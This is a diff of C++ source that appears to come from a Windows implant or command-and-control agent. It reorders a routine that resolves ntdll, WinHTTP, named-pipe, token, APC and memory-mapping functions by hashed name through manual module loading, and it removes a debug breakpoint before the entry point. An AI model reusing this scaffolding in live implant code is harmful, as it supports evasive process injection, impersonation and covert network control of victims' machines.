@@ -166,16 +166,58 @@ namespace Main {
 		bool success = true;
 		x_assertb(ctx->modules.kernel32 = (HMODULE) M_PTR(KERNEL32));
 		x_assertb(ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));
-		x_assertb(ctx->modules.shlwapi	= (HMODULE) M_PTR(SHLWAPI));
 
-    	// TODO: Memory leak for heap-allocated EXECUTABLE*. Only need DllBase
-        x_assertb(ctx->modules.crypt32  = (HMODULE) ImportModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr)->base);
-        x_assertb(ctx->modules.winhttp  = (HMODULE) ImportModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr)->base);
-        x_assertb(ctx->modules.advapi   = (HMODULE) ImportModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr)->base);
-        x_assertb(ctx->modules.iphlpapi = (HMODULE) ImportModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr)->base);
-        x_assertb(ctx->modules.mscoree  = (HMODULE) ImportModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr)->base);
+		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenProcess, 							ctx->modules.ntdll, NTOPENPROCESS));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateUserProcess, 					ctx->modules.ntdll, NTCREATEUSERPROCESS));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtTerminateProcess, 					ctx->modules.ntdll, NTTERMINATEPROCESS));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlCreateProcessParametersEx, 			ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlDestroyProcessParameters, 			ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenProcessToken, 					ctx->modules.ntdll, NTOPENPROCESSTOKEN));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenThreadToken, 						ctx->modules.ntdll, NTOPENTHREADTOKEN));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtDuplicateToken, 						ctx->modules.ntdll, NTDUPLICATETOKEN));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtDuplicateObject, 						ctx->modules.ntdll, NTDUPLICATEOBJECT));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtQueryInformationToken, 				ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtQueryInformationProcess, 				ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtFreeVirtualMemory, 					ctx->modules.ntdll, NTFREEVIRTUALMEMORY));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtAllocateVirtualMemory, 				ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtProtectVirtualMemory, 				ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtReadVirtualMemory, 					ctx->modules.ntdll, NTREADVIRTUALMEMORY));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtWriteVirtualMemory, 					ctx->modules.ntdll, NTWRITEVIRTUALMEMORY));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtQueryVirtualMemory, 					ctx->modules.ntdll, NTQUERYVIRTUALMEMORY));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateSection, 						ctx->modules.ntdll, NTCREATESECTION));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtMapViewOfSection, 					ctx->modules.ntdll, NTMAPVIEWOFSECTION));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtUnmapViewOfSection, 					ctx->modules.ntdll, NTUNMAPVIEWOFSECTION));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlAddVectoredExceptionHandler, 		ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlRemoveVectoredExceptionHandler, 		ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlCreateHeap, 							ctx->modules.ntdll, RTLCREATEHEAP));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlAllocateHeap, 						ctx->modules.ntdll, RTLALLOCATEHEAP));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlReAllocateHeap, 						ctx->modules.ntdll, RTLREALLOCATEHEAP));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlFreeHeap, 							ctx->modules.ntdll, RTLFREEHEAP));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlDestroyHeap, 						ctx->modules.ntdll, RTLDESTROYHEAP));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlRbInsertNodeEx, 						ctx->modules.ntdll, RTLRBINSERTNODEEX));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlGetVersion, 							ctx->modules.ntdll, RTLGETVERSION));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtQuerySystemInformation, 				ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtQuerySystemTime, 						ctx->modules.ntdll, NTQUERYSYSTEMTIME));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateThreadEx, 						ctx->modules.ntdll, NTCREATETHREADEX));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenThread, 							ctx->modules.ntdll, NTOPENTHREAD));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtTerminateThread, 						ctx->modules.ntdll, NTTERMINATETHREAD));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtResumeThread, 						ctx->modules.ntdll, NTRESUMETHREAD));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtGetContextThread, 					ctx->modules.ntdll, NTGETCONTEXTTHREAD));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtSetContextThread, 					ctx->modules.ntdll, NTSETCONTEXTTHREAD));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtSetInformationThread, 				ctx->modules.ntdll, NTSETINFORMATIONTHREAD));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtTestAlert, 							ctx->modules.ntdll, NTTESTALERT));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtDelayExecution, 						ctx->modules.ntdll, NTDELAYEXECUTION));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateEvent, 							ctx->modules.ntdll, NTCREATEEVENT));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtQueueApcThread, 						ctx->modules.ntdll, NTQUEUEAPCTHREAD));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtAlertResumeThread, 					ctx->modules.ntdll, NTALERTRESUMETHREAD));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtWaitForSingleObject, 					ctx->modules.ntdll, NTWAITFORSINGLEOBJECT));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtSignalAndWaitForSingleObject, 		ctx->modules.ntdll, NTSIGNALANDWAITFORSINGLEOBJECT));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtContinue, 							ctx->modules.ntdll, NTCONTINUE));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlInitUnicodeString, 					ctx->modules.ntdll, RTLINITUNICODESTRING));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlHashUnicodeString, 					ctx->modules.ntdll, RTLHASHUNICODESTRING));
+		x_assertb(F_PTR_HMOD(ctx->win32.RtlRandomEx, 							ctx->modules.ntdll, RTLRANDOMEX));
+		x_assertb(F_PTR_HMOD(ctx->win32.NtClose, 								ctx->modules.ntdll, NTCLOSE));
 
-#pragma region IOAPI
 		x_assertb(F_PTR_HMOD(ctx->win32.DeviceIoControl,                        ctx->modules.kernel32, DEVICEIOCONTROL));
 		x_assertb(F_PTR_HMOD(ctx->win32.FileTimeToSystemTime, 					ctx->modules.kernel32, FILETIMETOSYSTEMTIME));
 		x_assertb(F_PTR_HMOD(ctx->win32.GetCurrentDirectoryA, 					ctx->modules.kernel32, GETCURRENTDIRECTORYA));
@@ -187,9 +229,42 @@ namespace Main {
 		x_assertb(F_PTR_HMOD(ctx->win32.FindClose, 								ctx->modules.kernel32, FINDCLOSE));
 		x_assertb(F_PTR_HMOD(ctx->win32.GetFileSize, 							ctx->modules.kernel32, GETFILESIZE));
 		x_assertb(F_PTR_HMOD(ctx->win32.ReadFile, 								ctx->modules.kernel32, READFILE));
-#pragma endregion
+		x_assertb(F_PTR_HMOD(ctx->win32.CallNamedPipeW, 						ctx->modules.kernel32, CALLNAMEDPIPEW));
+		x_assertb(F_PTR_HMOD(ctx->win32.CreateNamedPipeW, 						ctx->modules.kernel32, CREATENAMEDPIPEW));
+		x_assertb(F_PTR_HMOD(ctx->win32.WaitNamedPipeW, 						ctx->modules.kernel32, WAITNAMEDPIPEW));
+		x_assertb(F_PTR_HMOD(ctx->win32.SetNamedPipeHandleState, 				ctx->modules.kernel32, SETNAMEDPIPEHANDLESTATE));
+		x_assertb(F_PTR_HMOD(ctx->win32.ConnectNamedPipe, 						ctx->modules.kernel32, CONNECTNAMEDPIPE));
+		x_assertb(F_PTR_HMOD(ctx->win32.TransactNamedPipe, 						ctx->modules.kernel32, TRANSACTNAMEDPIPE));
+		x_assertb(F_PTR_HMOD(ctx->win32.DisconnectNamedPipe, 					ctx->modules.kernel32, DISCONNECTNAMEDPIPE));
+		x_assertb(F_PTR_HMOD(ctx->win32.PeekNamedPipe, 							ctx->modules.kernel32, PEEKNAMEDPIPE));
+		x_assertb(F_PTR_HMOD(ctx->win32.GetProcAddress, 						ctx->modules.kernel32, GETPROCADDRESS));
+		x_assertb(F_PTR_HMOD(ctx->win32.GetModuleHandleA, 						ctx->modules.kernel32, GETMODULEHANDLEA));
+		x_assertb(F_PTR_HMOD(ctx->win32.LoadLibraryA, 							ctx->modules.kernel32, LOADLIBRARYA));
+		x_assertb(F_PTR_HMOD(ctx->win32.FreeLibrary, 							ctx->modules.kernel32, FREELIBRARY));
+    	x_assertb(F_PTR_HMOD(ctx->win32.IsWow64Process, 						ctx->modules.kernel32, ISWOW64PROCESS));
+		x_assertb(F_PTR_HMOD(ctx->win32.GetUserNameA, 							ctx->modules.kernel32, GETUSERNAMEA));
+		x_assertb(F_PTR_HMOD(ctx->win32.CreateToolhelp32Snapshot, 				ctx->modules.kernel32, CREATETOOLHELP32SNAPSHOT));
+		x_assertb(F_PTR_HMOD(ctx->win32.Process32First, 						ctx->modules.kernel32, PROCESS32FIRST));
+		x_assertb(F_PTR_HMOD(ctx->win32.Process32Next, 							ctx->modules.kernel32, PROCESS32NEXT));
+		x_assertb(F_PTR_HMOD(ctx->win32.GlobalMemoryStatusEx, 					ctx->modules.kernel32, GLOBALMEMORYSTATUSEX));
+		x_assertb(F_PTR_HMOD(ctx->win32.GetComputerNameExA, 					ctx->modules.kernel32, GETCOMPUTERNAMEEXA));
+		x_assertb(F_PTR_HMOD(ctx->win32.CLRCreateInstance, 						ctx->modules.kernel32, CLRCREATEINSTANCE));
+		x_assertb(F_PTR_HMOD(ctx->win32.SleepEx, 								ctx->modules.kernel32, SLEEPEX));
+    	x_assertb(F_PTR_HMOD(ctx->win32.FindResourceA, 							ctx->modules.kernel32, FINDRESOURCEA));
+		x_assertb(F_PTR_HMOD(ctx->win32.LoadResource, 							ctx->modules.kernel32, LOADRESOURCE));
+		x_assertb(F_PTR_HMOD(ctx->win32.LockResource, 							ctx->modules.kernel32, LOCKRESOURCE));
+		x_assertb(F_PTR_HMOD(ctx->win32.SizeofResource, 						ctx->modules.kernel32, SIZEOFRESOURCE));
+		x_assertb(F_PTR_HMOD(ctx->win32.FreeResource, 							ctx->modules.kernel32, FREERESOURCE));
+		x_assertb(F_PTR_HMOD(ctx->win32.SetProcessValidCallTargets, 			ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
 
-#pragma region SECAPI
+		// TODO: Memory leak for heap-allocated EXECUTABLE*. Only need DllBase
+		x_assertb(ctx->modules.shlwapi	= (HMODULE) ImportModule(LoadLocalFile, SHLWAPI, nullptr, 0, nullptr)->base);
+        x_assertb(ctx->modules.crypt32  = (HMODULE) ImportModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr)->base);
+        x_assertb(ctx->modules.winhttp  = (HMODULE) ImportModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr)->base);
+        x_assertb(ctx->modules.advapi   = (HMODULE) ImportModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr)->base);
+        x_assertb(ctx->modules.iphlpapi = (HMODULE) ImportModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr)->base);
+        x_assertb(ctx->modules.mscoree  = (HMODULE) ImportModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr)->base);
+
 		x_assertb(F_PTR_HMOD(ctx->win32.LookupAccountSidW, 						ctx->modules.advapi, LOOKUPACCOUNTSIDW));
 		x_assertb(F_PTR_HMOD(ctx->win32.LookupPrivilegeValueA, 					ctx->modules.advapi, LOOKUPPRIVILEGEVALUEA));
 		x_assertb(F_PTR_HMOD(ctx->win32.AddMandatoryAce, 						ctx->modules.advapi, ADDMANDATORYACE));
@@ -200,9 +275,14 @@ namespace Main {
 		x_assertb(F_PTR_HMOD(ctx->win32.SetSecurityDescriptorSacl, 				ctx->modules.advapi, SETSECURITYDESCRIPTORSACL));
 		x_assertb(F_PTR_HMOD(ctx->win32.InitializeAcl, 							ctx->modules.advapi, INITIALIZEACL));
 		x_assertb(F_PTR_HMOD(ctx->win32.FreeSid, 								ctx->modules.advapi, FREESID));
-#pragma endregion
+		x_assertb(F_PTR_HMOD(ctx->win32.ImpersonateLoggedOnUser, 				ctx->modules.advapi, IMPERSONATELOGGEDONUSER));
+		x_assertb(F_PTR_HMOD(ctx->win32.AdjustTokenPrivileges, 					ctx->modules.advapi, ADJUSTTOKENPRIVILEGES));
+		x_assertb(F_PTR_HMOD(ctx->win32.RegOpenKeyExA, 							ctx->modules.advapi, REGOPENKEYEXA));
+		x_assertb(F_PTR_HMOD(ctx->win32.RegCreateKeyExA, 						ctx->modules.advapi, REGCREATEKEYEXA));
+		x_assertb(F_PTR_HMOD(ctx->win32.RegSetValueExA, 						ctx->modules.advapi, REGSETVALUEEXA));
+		x_assertb(F_PTR_HMOD(ctx->win32.RegCloseKey, 							ctx->modules.advapi, REGCLOSEKEY));
+		x_assertb(F_PTR_HMOD(ctx->win32.GetAdaptersInfo, 						ctx->modules.iphlpapi, GETADAPTERSINFO));
 
-#pragma region NETAPI
 		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpen, 							ctx->modules.winhttp, WINHTTPOPEN));
 		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpConnect, 					    ctx->modules.winhttp, WINHTTPCONNECT));
 		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpenRequest, 					ctx->modules.winhttp, WINHTTPOPENREQUEST));
@@ -216,111 +296,10 @@ namespace Main {
 		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryHeaders, 					ctx->modules.winhttp, WINHTTPQUERYHEADERS));
 		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryDataAvailable, 				ctx->modules.winhttp, WINHTTPQUERYDATAAVAILABLE));
 		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpCloseHandle, 					ctx->modules.winhttp, WINHTTPCLOSEHANDLE));
-		x_assertb(F_PTR_HMOD(ctx->win32.CallNamedPipeW, 						ctx->modules.kernel32, CALLNAMEDPIPEW));
-		x_assertb(F_PTR_HMOD(ctx->win32.CreateNamedPipeW, 						ctx->modules.kernel32, CREATENAMEDPIPEW));
-		x_assertb(F_PTR_HMOD(ctx->win32.WaitNamedPipeW, 						ctx->modules.kernel32, WAITNAMEDPIPEW));
-		x_assertb(F_PTR_HMOD(ctx->win32.SetNamedPipeHandleState, 				ctx->modules.kernel32, SETNAMEDPIPEHANDLESTATE));
-		x_assertb(F_PTR_HMOD(ctx->win32.ConnectNamedPipe, 						ctx->modules.kernel32, CONNECTNAMEDPIPE));
-		x_assertb(F_PTR_HMOD(ctx->win32.TransactNamedPipe, 						ctx->modules.kernel32, TRANSACTNAMEDPIPE));
-		x_assertb(F_PTR_HMOD(ctx->win32.DisconnectNamedPipe, 					ctx->modules.kernel32, DISCONNECTNAMEDPIPE));
-		x_assertb(F_PTR_HMOD(ctx->win32.PeekNamedPipe, 							ctx->modules.kernel32, PEEKNAMEDPIPE));
-#pragma endregion
 
-#pragma region PROCAPI
-		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenProcess, 							ctx->modules.ntdll, NTOPENPROCESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateUserProcess, 					ctx->modules.ntdll, NTCREATEUSERPROCESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtTerminateProcess, 					ctx->modules.ntdll, NTTERMINATEPROCESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlCreateProcessParametersEx, 			ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlDestroyProcessParameters, 			ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenProcessToken, 					ctx->modules.ntdll, NTOPENPROCESSTOKEN));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenThreadToken, 						ctx->modules.ntdll, NTOPENTHREADTOKEN));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtDuplicateToken, 						ctx->modules.ntdll, NTDUPLICATETOKEN));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtDuplicateObject, 						ctx->modules.ntdll, NTDUPLICATEOBJECT));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtQueryInformationToken, 				ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtQueryInformationProcess, 				ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.ImpersonateLoggedOnUser, 				ctx->modules.advapi, IMPERSONATELOGGEDONUSER));
-		x_assertb(F_PTR_HMOD(ctx->win32.AdjustTokenPrivileges, 					ctx->modules.advapi, ADJUSTTOKENPRIVILEGES));
-#pragma endregion
 
-#pragma region MEMAPI
-		x_assertb(F_PTR_HMOD(ctx->win32.NtFreeVirtualMemory, 					ctx->modules.ntdll, NTFREEVIRTUALMEMORY));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtAllocateVirtualMemory, 				ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtProtectVirtualMemory, 				ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtReadVirtualMemory, 					ctx->modules.ntdll, NTREADVIRTUALMEMORY));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtWriteVirtualMemory, 					ctx->modules.ntdll, NTWRITEVIRTUALMEMORY));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtQueryVirtualMemory, 					ctx->modules.ntdll, NTQUERYVIRTUALMEMORY));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateSection, 						ctx->modules.ntdll, NTCREATESECTION));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtMapViewOfSection, 					ctx->modules.ntdll, NTMAPVIEWOFSECTION));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtUnmapViewOfSection, 					ctx->modules.ntdll, NTUNMAPVIEWOFSECTION));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlAddVectoredExceptionHandler, 		ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlRemoveVectoredExceptionHandler, 		ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER));
-		x_assertb(F_PTR_HMOD(ctx->win32.SetProcessValidCallTargets, 			ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlCreateHeap, 							ctx->modules.ntdll, RTLCREATEHEAP));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlAllocateHeap, 						ctx->modules.ntdll, RTLALLOCATEHEAP));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlReAllocateHeap, 						ctx->modules.ntdll, RTLREALLOCATEHEAP));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlFreeHeap, 							ctx->modules.ntdll, RTLFREEHEAP));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlDestroyHeap, 						ctx->modules.ntdll, RTLDESTROYHEAP));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlRbInsertNodeEx, 						ctx->modules.ntdll, RTLRBINSERTNODEEX));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetProcAddress, 						ctx->modules.kernel32, GETPROCADDRESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetModuleHandleA, 						ctx->modules.kernel32, GETMODULEHANDLEA));
-		x_assertb(F_PTR_HMOD(ctx->win32.LoadLibraryA, 							ctx->modules.kernel32, LOADLIBRARYA));
-		x_assertb(F_PTR_HMOD(ctx->win32.FreeLibrary, 							ctx->modules.kernel32, FREELIBRARY));
-#pragma endregion
-
-#pragma region ENUMAPI
-		x_assertb(F_PTR_HMOD(ctx->win32.RegOpenKeyExA, 							ctx->modules.advapi, REGOPENKEYEXA));
-		x_assertb(F_PTR_HMOD(ctx->win32.RegCreateKeyExA, 						ctx->modules.advapi, REGCREATEKEYEXA));
-		x_assertb(F_PTR_HMOD(ctx->win32.RegSetValueExA, 						ctx->modules.advapi, REGSETVALUEEXA));
-		x_assertb(F_PTR_HMOD(ctx->win32.RegCloseKey, 							ctx->modules.advapi, REGCLOSEKEY));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetAdaptersInfo, 						ctx->modules.iphlpapi, GETADAPTERSINFO));
-    	x_assertb(F_PTR_HMOD(ctx->win32.IsWow64Process, 						ctx->modules.kernel32, ISWOW64PROCESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetUserNameA, 							ctx->modules.kernel32, GETUSERNAMEA));
-		x_assertb(F_PTR_HMOD(ctx->win32.CreateToolhelp32Snapshot, 				ctx->modules.kernel32, CREATETOOLHELP32SNAPSHOT));
-		x_assertb(F_PTR_HMOD(ctx->win32.Process32First, 						ctx->modules.kernel32, PROCESS32FIRST));
-		x_assertb(F_PTR_HMOD(ctx->win32.Process32Next, 							ctx->modules.kernel32, PROCESS32NEXT));
-		x_assertb(F_PTR_HMOD(ctx->win32.GlobalMemoryStatusEx, 					ctx->modules.kernel32, GLOBALMEMORYSTATUSEX));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetComputerNameExA, 					ctx->modules.kernel32, GETCOMPUTERNAMEEXA));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlGetVersion, 							ctx->modules.ntdll, RTLGETVERSION));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtQuerySystemInformation, 				ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtQuerySystemTime, 						ctx->modules.ntdll, NTQUERYSYSTEMTIME));
-		x_assertb(F_PTR_HMOD(ctx->win32.CLRCreateInstance, 						ctx->modules.kernel32, CLRCREATEINSTANCE));
-#pragma endregion
-
-#pragma region THREADAPI
-		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateThreadEx, 						ctx->modules.ntdll, NTCREATETHREADEX));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtOpenThread, 							ctx->modules.ntdll, NTOPENTHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtTerminateThread, 						ctx->modules.ntdll, NTTERMINATETHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtResumeThread, 						ctx->modules.ntdll, NTRESUMETHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtGetContextThread, 					ctx->modules.ntdll, NTGETCONTEXTTHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtSetContextThread, 					ctx->modules.ntdll, NTSETCONTEXTTHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtSetInformationThread, 				ctx->modules.ntdll, NTSETINFORMATIONTHREAD));
-#pragma endregion
-
-#pragma region APCAPI
-		x_assertb(F_PTR_HMOD(ctx->win32.NtTestAlert, 							ctx->modules.ntdll, NTTESTALERT));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtDelayExecution, 						ctx->modules.ntdll, NTDELAYEXECUTION));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtCreateEvent, 							ctx->modules.ntdll, NTCREATEEVENT));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtQueueApcThread, 						ctx->modules.ntdll, NTQUEUEAPCTHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtAlertResumeThread, 					ctx->modules.ntdll, NTALERTRESUMETHREAD));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtWaitForSingleObject, 					ctx->modules.ntdll, NTWAITFORSINGLEOBJECT));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtSignalAndWaitForSingleObject, 		ctx->modules.ntdll, NTSIGNALANDWAITFORSINGLEOBJECT));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtContinue, 							ctx->modules.ntdll, NTCONTINUE));
-#pragma endregion
-
-#pragma region UTILAPI
 		x_assertb(F_PTR_HMOD(ctx->win32.CryptStringToBinaryA, 					ctx->modules.crypt32, CRYPTSTRINGTOBINARYA));
 		x_assertb(F_PTR_HMOD(ctx->win32.CryptBinaryToStringA, 					ctx->modules.crypt32, CRYPTBINARYTOSTRINGA));
-		x_assertb(F_PTR_HMOD(ctx->win32.SleepEx, 								ctx->modules.kernel32, SLEEPEX));
-    	x_assertb(F_PTR_HMOD(ctx->win32.FindResourceA, 							ctx->modules.kernel32, FINDRESOURCEA));
-		x_assertb(F_PTR_HMOD(ctx->win32.LoadResource, 							ctx->modules.kernel32, LOADRESOURCE));
-		x_assertb(F_PTR_HMOD(ctx->win32.LockResource, 							ctx->modules.kernel32, LOCKRESOURCE));
-		x_assertb(F_PTR_HMOD(ctx->win32.SizeofResource, 						ctx->modules.kernel32, SIZEOFRESOURCE));
-		x_assertb(F_PTR_HMOD(ctx->win32.FreeResource, 							ctx->modules.kernel32, FREERESOURCE));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlInitUnicodeString, 					ctx->modules.ntdll, RTLINITUNICODESTRING));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlHashUnicodeString, 					ctx->modules.ntdll, RTLHASHUNICODESTRING));
-		x_assertb(F_PTR_HMOD(ctx->win32.RtlRandomEx, 							ctx->modules.ntdll, RTLRANDOMEX));
-		x_assertb(F_PTR_HMOD(ctx->win32.NtClose, 								ctx->modules.ntdll, NTCLOSE));
-#pragma endregion
 
         defer:
 		return success;
@@ -396,7 +375,6 @@ namespace Main {
 using namespace Main;
 VOID Entrypoint() {
 
-    __debugbreak();
     if (!ContextInit() || !ResolveApi() || !ReadConfig()) {
         return;
     }
